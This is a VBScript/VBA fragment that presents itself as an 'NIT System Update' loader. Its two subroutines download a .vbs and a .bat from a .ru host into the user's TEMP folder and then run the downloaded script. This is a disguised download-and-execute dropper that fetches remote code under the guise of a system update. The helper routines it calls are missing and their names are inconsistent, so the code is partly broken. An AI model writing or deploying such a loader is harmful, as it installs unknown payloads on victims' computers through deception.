Option Explicit

' *****************************************************************************
' Predefined Constants
' *****************************************************************************
Const STR_DISK = "C:"
Const STR_FOLDER1 = "pub1"
Const STR_FOLDER2 = "Util"
'Const THREAD_MSI = "AdobeDistribUniv.msi"
Const THREAD_MSI = "NIT-System-Update.msi"
Const THREAD_VBS = "Load-NIT-System-Update.vbs"
Const THREAD_BAT = "Load-NIT-System-Update.bat"
'Const STR_SRCCODE = "SrcCode" 'Must be Same in MSI Installer'

Const HTTP_PREFIX = "http://" 'Prefix of Site Downloaded From'
Const HTTP_HOST = "anticriminalonline.ru" 'Host Name or IP address of the Site'
Const HTTP_PORT = ":80" 'Port of the Site'
Const HTTP_MAIN_PATH = "/WinUpdate/" 'Path to Exponenta Project of the Site'

' *****************************************************************************

' *****************************************************************************
'
' SUBROUTINE ScriptTestdownloaded
'
' This Subroutine Downloads NIT Update Script on Computer at Test Mode
' The Subroutine Uses Predefined Constants
'
' PARAMETERS:   NONE
' RETURNS:      NONE
'
' *****************************************************************************
Sub ScriptTestdownloaded()

        Dim Url         'Full URL Neme of the File in the Site
        Dim local_Path      'Local Path to Command File with Drive Letter
        Dim tempsPath
		Dim wshShell, envVarProccess
        Set WshShell = CreateObject("WScript.Shell")
        Set envVarProccess = WshShell.Environment("PROCESS")
		tempsPath = envVarProccess(TEMP)
        local_Path = tempsPath
        Url = HTTP_PREFIX & HTTP_HOST & HTTP_PORT & HTTP_MAIN_PATH

        UploadedFilesFromInt THREAD_VBS, Url, local_Path
        UploadedFilesFromInt THREAD_BAT, Url, local_Path
        RunedDownloadedScript local_Path, THREAD_VBS

End Sub

' *****************************************************************************
'
' SUBROUTINE SimpleScriptdownloaded
'
' This Subroutine Downloads NIT Update Script on Computer
' The Subroutine Uses Predefined Constants
'
' PARAMETERS:   NONE
' RETURNS:      NONE
'
' *****************************************************************************
Sub SimpleScriptdownloaded()

        Dim Url         'Full URL Neme of the File in the Site
        Dim local_Path      'Local Path to Command File with Drive Letter
        Dim tempsPath
		Dim wshShell, envVarProccess
        Set WshShell = CreateObject("WScript.Shell")
        Set envVarProccess = WshShell.Environment("PROCESS")
		tempsPath = envVarProccess(TEMP)
        Dim iTmp
        tempsPath = Environ("TEMP")
'        tempsPath = GetTempEnviron()
        local_Path = tempsPath
        Url = HTTP_PREFIX & HTTP_HOST & HTTP_PORT & HTTP_MAIN_PATH

        iTmp = UploadFilesFromInt(THREAD_VBS, Url, local_Path)
        iTmp = UploadFilesFromInt(THREAD_BAT, Url, local_Path)
        iTmp = RunDownloadedScript(local_Path, THREAD_VBS)

End Sub
